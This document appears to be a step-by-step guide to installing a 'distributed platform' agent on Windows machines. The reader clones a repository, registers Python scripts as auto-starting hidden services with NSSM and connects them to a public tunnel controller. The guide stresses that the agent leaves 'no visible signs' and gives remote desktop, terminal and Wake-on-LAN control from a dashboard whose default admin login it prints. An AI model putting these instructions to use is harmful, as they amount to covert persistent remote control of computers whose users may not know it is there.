PERMANENT INVISIBLE AGENT - COMPLETE GUIDE
============================================

THE AGENT RUNS FOREVER. NO TERMINAL. NO VISIBLE WINDOW.
EVEN WHEN THE COMPUTER "OFF", YOU CAN TURN IT ON REMOTELY.

==============================================================
STEP 1: DOWNLOAD FROM GITHUB (ONE TIME)
==============================================================
On the computer you want to add:
1. Open Command Prompt (Win+R, type cmd, Enter)
2. Type: cd %USERPROFILE%
3. Type: git clone https://github.com/nikolamagdelinic0-star/distributed-platform-node-agent.git
4. Type: cd distributed-platform-node-agent

==============================================================
STEP 2: INSTALL PYTHON
==============================================================
1. Go to python.org/downloads
2. Download Python 3.10+
3. Run installer — CHECK "Add Python to PATH" box
4. Verify: type "python --version" → should show Python 3.x.x

==============================================================
STEP 3: INSTALL DEPENDENCIES
==============================================================
In the folder, type:
  pip install psutil requests wakeonlan

==============================================================
STEP 4: CONFIGURE
==============================================================
Open agent_config.txt in Notepad.
Change CONTROLLER_URL to: https://dp-platform-2026.loca.lt
Save.

==============================================================
STEP 5: INSTALL AS A HIDDEN SERVICE (KEY STEP)
==============================================================
This makes the agent run permanently, invisibly, auto-start on boot.

A. DOWNLOAD NSSM (one-time):
   Go to https://nssm.cc/use.html
   Download nssm-2.24.zip
   Extract nssm.exe
   Place nssm.exe in the same folder as the agent files.

B. OPEN COMMAND PROMPT AS ADMINISTRATOR:
   Press Win, type "cmd"
   Right-click "Command Prompt" → "Run as Administrator"

C. INSTALL THE SERVICE:
   cd %USERPROFILE%\distributed-platform-node-agent
   nssm install DistPlatformAgent python hidden_service.py
   nssm set DistPlatformAgent AppDirectory "%USERPROFILE%\distributed-platform-node-agent"
   nssm set DistPlatformAgent DisplayName "Distributed Computing Platform Agent"
   nssm set DistPlatformAgent Start AUTO
   nssm set DistPlatformAgent AppNoConsole 1
   nssm install DistPlatformListener python agent_listener.py
   nssm set DistPlatformListener AppDirectory "%USERPROFILE%\distributed-platform-node-agent"
   nssm set DistPlatformListener DisplayName "Distributed Platform Job Listener"
   nssm set DistPlatformListener Start AUTO
   nssm set DistPlatformListener AppNoConsole 1

D. START THE SERVICE:
   nssm start DistPlatformAgent
   nssm start DistPlatformListener

==============================================================
WHAT THIS MEANS
==============================================================

- The agent runs permanently as a hidden Windows service
- No terminal window ever appears
- No visible signs on the computer
- Starts automatically when Windows boots
- Completely invisible — you cannot see it running
- Monitor stays off / shows nothing
- Even when computer appears off, it listens for wake signal

==============================================================
HOW TO TURN THE COMPUTER ON/OFF REMOTELY
==============================================================

From the dashboard:
1. Find the node in the Nodes list
2. It shows as OFFLINE
3. Click "Wake On" or "Turn On"
4. The controller sends a Wake-on-LAN magic packet
5. The computer's network card receives it and boots up
6. The agent starts and connects to the controller
7. The node shows as ONLINE

==============================================================
HOW TO USE THE COMPUTER FROM ANYWHERE
==============================================================

Once the node is ONLINE:
- Remote Desktop: Click "Remote Desktop" on the node
- Terminal: Click "Terminal" to access the command line
- Compute: Submit jobs that use this computer's power
- All computers combined into one supercomputer

==============================================================
TROUBLESHOOTING
==============================================================

If the node shows OFFLINE:
- Make sure nssm service is running: nssm query DistPlatformAgent
- Check agent.log in the folder for errors
- Ensure the computer is plugged in (not battery)
- Enable Wake-on-LAN in BIOS/UEFI settings

Wake-on-LAN BIOS setup:
1. Restart computer → Enter BIOS/UEFI (usually F2, F10, or DEL)
2. Find "Wake on LAN" or "Power Management"
3. Enable "Wake on Magic Packet"
4. Save and exit

==============================================================
ADD MORE COMPUTERS
==============================================================
Repeat Steps 1-5 on each computer.
Then approve each node in the dashboard.

==============================================================
CONTROLLER DASHBOARD
==============================================================
URL: https://dp-platform-2026.loca.lt/static/index.html
Login: admin / admin_default_change_me
==============================================================
